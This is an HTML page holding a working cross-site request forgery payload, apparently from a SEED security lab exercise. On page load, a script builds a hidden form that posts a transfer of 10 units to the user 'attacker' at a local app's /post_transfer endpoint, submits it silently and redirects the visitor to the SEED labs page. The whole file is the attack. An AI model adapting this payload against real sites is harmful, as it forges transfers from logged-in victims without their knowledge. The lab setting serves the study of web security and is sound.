<!DOCTYPE html>
  <html>
  <body>
    <script>
      function forge_post() {
        var fields;

        fields += '<input type="hidden" name="destination_username" value="attacker"/>';
        fields += '<input type="hidden" name="quantity" value="10"/>'

        var p = document.createElement("form");

        p.action = "http://localhost:3000/post_transfer";
        p.innerHTML = fields;
        p.method = "post";

        document.body.appendChild(p);

        p.submit();
      }

      window.onload = () => {
        forge_post();
        window.location = "https://seedsecuritylabs.org/labs.html";
      };
    </script>
  </body>
</html>
